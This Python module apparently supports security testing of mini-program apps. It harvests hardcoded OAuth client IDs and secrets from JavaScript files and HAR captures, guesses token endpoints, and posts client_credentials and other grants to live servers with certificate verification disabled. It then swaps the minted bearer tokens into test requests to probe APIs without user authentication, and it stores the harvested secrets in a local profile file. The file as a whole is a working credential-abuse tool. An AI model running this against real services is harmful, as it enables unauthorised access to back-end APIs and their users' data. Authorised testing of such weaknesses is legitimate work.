# -*- coding: utf-8 -*-
"""Discover hardcoded OAuth/Basic client credentials and mint access tokens.

Generic (not app-specific): scan mini-program JS + τ_A HAR for
  - Authorization: Basic <b64>
  - client_id / client_secret literals
  - oauth/token endpoints
then try grant_type=client_credentials (and nearby variants) to obtain a
server-scope Bearer usable for zero-user-auth probes.
"""
from __future__ import annotations

import base64
import json
import re
import ssl
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

BASIC_AUTH_RE = re.compile(
    r"""Authorization\s*[:=]\s*['"]Basic\s+([A-Za-z0-9+/=]{8,})['"]""",
    re.I,
)
BASIC_AUTH_HAR_RE = re.compile(r'^Basic\s+([A-Za-z0-9+/=]{8,})$', re.I)
CLIENT_ID_RE = re.compile(
    r"""['"]?client_?id['"]?\s*[:=]\s*['"]([A-Za-z0-9_.\-]{3,64})['"]""",
    re.I,
)
CLIENT_SECRET_RE = re.compile(
    r"""['"]?client_?secret['"]?\s*[:=]\s*['"]([A-Za-z0-9_.\-/=+]{3,128})['"]""",
    re.I,
)
OAUTH_TOKEN_PATH_RE = re.compile(
    r'(/auth/oauth/token|/oauth/token|/oauth2/token|/oauth/access_token|'
    r'/connect/token|/api/.*/oauth/token)',
    re.I,
)
GRANT_TYPE_RE = re.compile(
    r"""grant_type['"]?\s*[:=]\s*['"]?(client_credentials|customer|password|authorization_code)""",
    re.I,
)
CHANNEL_LIT_RE = re.compile(r"""Channel['"]?\s*[:=]\s*['"]?(\d{1,4})""", re.I)
TOKEN_SHAPE_RE = re.compile(
    r'^[A-Za-z0-9._\-]{16,}$'
)
BAD_TOKEN_VALUES = frozenset({
    'server_error', 'unauthorized', 'error', 'null', 'none', 'undefined',
    'full authentication is required to access this resource',
})
NOISE_TOKEN_HOST_RE = re.compile(
    r'(bspapp\.com|localhost|127\.0\.0\.1|hmma\.baidu\.com|w3\.org)',
    re.I,
)
SKIP_DIR_NAMES = frozenset({
    'node_modules', '.git', 'OUTPUT', 'CRBD_validation', '__pycache__',
    'dist', 'build', '.svn', 'vendor',
})


def _decode_basic(b64: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        raw = base64.b64decode(b64 + '===').decode('utf-8', errors='replace')
    except Exception:
        return None, None
    if ':' not in raw:
        return None, None
    user, secret = raw.split(':', 1)
    return user or None, secret or None


def _looks_like_oauth_basic(user: Optional[str], secret: Optional[str], b64: str) -> bool:
    if not user or not secret:
        return False
    # Avoid mistaking random base64 for client creds
    if len(b64) < 12:
        return False
    blob = f'{user}:{secret}'.lower()
    return bool(
        re.search(r'(client|customer|widget|app|oauth|api|wx|mini|server|bruts|secret)', blob)
        or (len(user) >= 4 and len(secret) >= 4)
    )


def _iter_js_files(root: Path, *, limit: int = 400) -> List[Path]:
    out: List[Path] = []
    if not root.is_dir():
        return out
    for p in root.rglob('*'):
        if not p.is_file():
            continue
        if p.suffix.lower() not in {'.js', '.ts', '.jsx', '.tsx'}:
            continue
        if any(part in SKIP_DIR_NAMES for part in p.parts):
            continue
        out.append(p)
        if len(out) >= limit:
            break
    return out


def discover_basic_from_source(source_dir: Path) -> List[Dict[str, Any]]:
    hits: List[Dict[str, Any]] = []
    seen: set = set()
    for path in _iter_js_files(source_dir):
        try:
            text = path.read_text(encoding='utf-8', errors='replace')
        except OSError:
            continue
        for m in BASIC_AUTH_RE.finditer(text):
            b64 = m.group(1)
            if b64 in seen:
                continue
            user, secret = _decode_basic(b64)
            if not _looks_like_oauth_basic(user, secret, b64):
                continue
            seen.add(b64)
            grants = sorted({g.lower() for g in GRANT_TYPE_RE.findall(text)})
            ch = CHANNEL_LIT_RE.search(text)
            hits.append({
                'source': 'js_literal',
                'path': str(path),
                'basic_b64': b64,
                'client_id': user,
                'client_secret': secret,
                'grant_types_hint': grants,
                'channel_hint': ch.group(1) if ch else None,
            })
        # client_id + client_secret pair in same file
        ids = CLIENT_ID_RE.findall(text)
        secrets = CLIENT_SECRET_RE.findall(text)
        if ids and secrets:
            cid, csec = ids[0], secrets[0]
            key = f'{cid}:{csec}'
            if key not in seen:
                seen.add(key)
                b64 = base64.b64encode(f'{cid}:{csec}'.encode()).decode('ascii')
                hits.append({
                    'source': 'js_client_pair',
                    'path': str(path),
                    'basic_b64': b64,
                    'client_id': cid,
                    'client_secret': csec,
                    'grant_types_hint': sorted({g.lower() for g in GRANT_TYPE_RE.findall(text)}),
                    'channel_hint': None,
                })
    return hits


def discover_basic_from_har(har_path: Path) -> List[Dict[str, Any]]:
    hits: List[Dict[str, Any]] = []
    if not har_path or not Path(har_path).exists():
        return hits
    try:
        har = json.loads(Path(har_path).read_text(encoding='utf-8', errors='replace'))
    except Exception:
        return hits
    seen: set = set()
    for entry in (har.get('log') or {}).get('entries') or []:
        req = entry.get('request') or {}
        url = req.get('url') or ''
        headers = {
            (h.get('name') or '').lower(): (h.get('value') or '')
            for h in (req.get('headers') or [])
            if isinstance(h, dict)
        }
        auth = headers.get('authorization') or ''
        m = BASIC_AUTH_HAR_RE.match(auth.strip())
        if not m:
            continue
        b64 = m.group(1)
        if b64 in seen:
            continue
        user, secret = _decode_basic(b64)
        if not _looks_like_oauth_basic(user, secret, b64):
            continue
        seen.add(b64)
        body = ((req.get('postData') or {}).get('text') or '')
        grants = sorted({g.lower() for g in GRANT_TYPE_RE.findall(body + url)})
        hits.append({
            'source': 'har_header',
            'path': urlparse(url).path or url,
            'url': url,
            'basic_b64': b64,
            'client_id': user,
            'client_secret': secret,
            'grant_types_hint': grants,
            'channel_hint': headers.get('channel'),
            'host': urlparse(url).netloc,
        })
    return hits


def discover_token_urls(
    *,
    har_path: Optional[Path],
    pack: Optional[Path],
    source_hits: List[Dict[str, Any]],
    har_hits: List[Dict[str, Any]],
) -> List[str]:
    urls: List[str] = []
    seen: set = set()

    def _add(u: str) -> None:
        u = (u or '').strip()
        if not u or u in seen:
            return
        host = urlparse(u).netloc
        if NOISE_TOKEN_HOST_RE.search(host or ''):
            return
        seen.add(u)
        urls.append(u)

    if har_path and Path(har_path).exists():
        try:
            har = json.loads(Path(har_path).read_text(encoding='utf-8', errors='replace'))
        except Exception:
            har = {}
        for entry in (har.get('log') or {}).get('entries') or []:
            url = ((entry.get('request') or {}).get('url') or '')
            if OAUTH_TOKEN_PATH_RE.search(urlparse(url).path or ''):
                _add(url.split('?')[0])

    # Reconstruct from host + known relative path
    hosts: List[str] = []
    for h in har_hits:
        if h.get('host'):
            hosts.append(h['host'])
    for h in source_hits:
        # try adapter / api plane hosts later
        pass
    if pack:
        for name in ('adapter_profile.json', 'api_plane_index.json'):
            p = Path(pack) / name
            if not p.exists():
                continue
            try:
                doc = json.loads(p.read_text(encoding='utf-8'))
            except Exception:
                continue
            for key in ('host_hints', 'hosts', 'base_urls'):
                for v in doc.get(key) or []:
                    if isinstance(v, str) and '://' in v:
                        hosts.append(urlparse(v).netloc)
            # plane entries
            for ent in (doc.get('entries') or []):
                if isinstance(ent, dict):
                    path = ent.get('path') or ''
                    if OAUTH_TOKEN_PATH_RE.search(path):
                        host = ent.get('host') or (hosts[0] if hosts else '')
                        if host:
                            _add(f'https://{host}{path}')
            pi = doc.get('path_index') or {}
            if isinstance(pi, dict):
                for path in pi:
                    if OAUTH_TOKEN_PATH_RE.search(str(path)):
                        host = hosts[0] if hosts else ''
                        if host:
                            _add(f'https://{host}{path}')

    for host in hosts:
        _add(f'https://{host}/auth/oauth/token')
        _add(f'https://{host}/oauth/token')

    return urls


def discover_oauth_client_material(
    *,
    project_dir: Path,
    pack: Path,
    har_path: Optional[Path] = None,
) -> Dict[str, Any]:
    """Return normalized material profile for CC-token minting."""
    project_dir = Path(project_dir)
    pack = Path(pack)
    source_hits = discover_basic_from_source(project_dir)
    har_hits = discover_basic_from_har(Path(har_path)) if har_path else []
    token_urls = discover_token_urls(
        har_path=Path(har_path) if har_path else None,
        pack=pack,
        source_hits=source_hits,
        har_hits=har_hits,
    )
    # Prefer HAR basic (proven live) then JS
    cred = None
    for row in har_hits + source_hits:
        cred = row
        break
    grant_hints: List[str] = []
    # Prefer standard CC grant before app-specific login grants
    for g in ('client_credentials', 'customer'):
        if g not in grant_hints:
            grant_hints.append(g)
    for row in har_hits + source_hits:
        for g in row.get('grant_types_hint') or []:
            gl = str(g).lower()
            if gl not in grant_hints:
                grant_hints.append(gl)

    ok = bool(cred and cred.get('basic_b64') and token_urls)
    profile = {
        'ok': ok,
        'schema_version': '1.0.0',
        'basic_b64': (cred or {}).get('basic_b64'),
        'client_id': (cred or {}).get('client_id'),
        'client_secret': (cred or {}).get('client_secret'),
        'credential_source': (cred or {}).get('source'),
        'credential_evidence': (cred or {}).get('path'),
        'token_urls': token_urls[:6],
        'grant_types': grant_hints[:6],
        'channel': (cred or {}).get('channel_hint') or '3',
        'sign': 'a',  # many stacks ignore Sign; PoC uses arbitrary value
        'source_hit_count': len(source_hits),
        'har_hit_count': len(har_hits),
        'evidence': {
            'source_hits': [
                {k: v for k, v in h.items() if k != 'client_secret'}
                for h in source_hits[:5]
            ],
            'har_hits': [
                {k: v for k, v in h.items() if k != 'client_secret'}
                for h in har_hits[:5]
            ],
        },
    }
    # Keep secret only for minting; still store in profile under pack (local research)
    if cred and cred.get('client_secret'):
        profile['client_secret'] = cred.get('client_secret')
    return profile


def mint_oauth_access_token(
    material: Dict[str, Any],
    *,
    timeout_sec: float = 20.0,
    insecure_ssl: bool = True,
) -> Dict[str, Any]:
    """POST grant_type=… with Basic auth; return access_token session."""
    if not material or not material.get('ok'):
        return {'ok': False, 'error': 'no_material'}
    basic = material.get('basic_b64')
    urls = list(material.get('token_urls') or [])
    grants = list(material.get('grant_types') or ['client_credentials'])
    if not basic or not urls:
        return {'ok': False, 'error': 'missing_basic_or_url'}

    ctx = ssl.create_default_context()
    if insecure_ssl:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    headers = {
        'Authorization': f'Basic {basic}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Channel': str(material.get('channel') or '3'),
        'Sign': str(material.get('sign') or 'a'),
        'Accept': '*/*',
    }
    last_err = None
    for url in urls:
        for grant in grants:
            body = f'grant_type={grant}'.encode('utf-8')
            try:
                req = urllib.request.Request(url, data=body, method='POST', headers=headers)
                with urllib.request.urlopen(req, context=ctx, timeout=timeout_sec) as resp:
                    raw = resp.read().decode('utf-8', errors='replace')
                    status = resp.status
            except urllib.error.HTTPError as e:
                raw = e.read().decode('utf-8', errors='replace') if e.fp else ''
                status = e.code
                last_err = f'HTTP {status}'
            except Exception as e:
                last_err = f'{type(e).__name__}: {e}'
                continue
            try:
                data = json.loads(raw) if raw else {}
            except json.JSONDecodeError:
                data = {}
            if int(status or 0) >= 400:
                last_err = f'http_{status} body={raw[:160]}'
                continue
            token = data.get('access_token') or data.get('accessToken')
            if not token and isinstance(data.get('data'), dict):
                token = data['data'].get('access_token') or data['data'].get('accessToken')
            token_s = str(token or '').strip()
            if not token_s or token_s.lower() in BAD_TOKEN_VALUES:
                last_err = f'bad_token status={status} body={raw[:160]}'
                continue
            if not TOKEN_SHAPE_RE.match(token_s):
                last_err = f'token_shape status={status} token={token_s[:40]}'
                continue
            return {
                'ok': True,
                'access_token': token_s,
                'token_type': data.get('token_type') or 'Bearer',
                'expires_in': data.get('expires_in'),
                'scope': data.get('scope'),
                'grant_type': grant,
                'token_url': url,
                'http_status': status,
            }
            # unreachable
    return {'ok': False, 'error': last_err or 'mint_failed'}


def apply_cc_bearer(test_case: Dict[str, Any], access_token: str, *, channel: str = '3') -> Dict[str, Any]:
    """Replace identity headers with CC Bearer (do not strip Channel)."""
    tc = dict(test_case)
    headers = dict(tc.get('headers') or {})
    drop = re.compile(
        r'^(authorization|token|cookie|session|appidentity|x-token|x-authorization)$',
        re.I,
    )
    for k in list(headers):
        if drop.match(k):
            headers.pop(k, None)
    headers['Authorization'] = f'Bearer {access_token}'
    headers.setdefault('Channel', channel)
    headers.setdefault('Accept', '*/*')
    tc['headers'] = headers
    return tc


def write_oauth_client_profile(pack: Path, profile: Dict[str, Any]) -> Path:
    pack = Path(pack)
    pack.mkdir(parents=True, exist_ok=True)
    out = pack / 'oauth_client_profile.json'
    # Redact secret in written profile? Keep for local mint replay; mark sensitive.
    safe = dict(profile)
    out.write_text(json.dumps(safe, ensure_ascii=False, indent=2), encoding='utf-8')
    return out
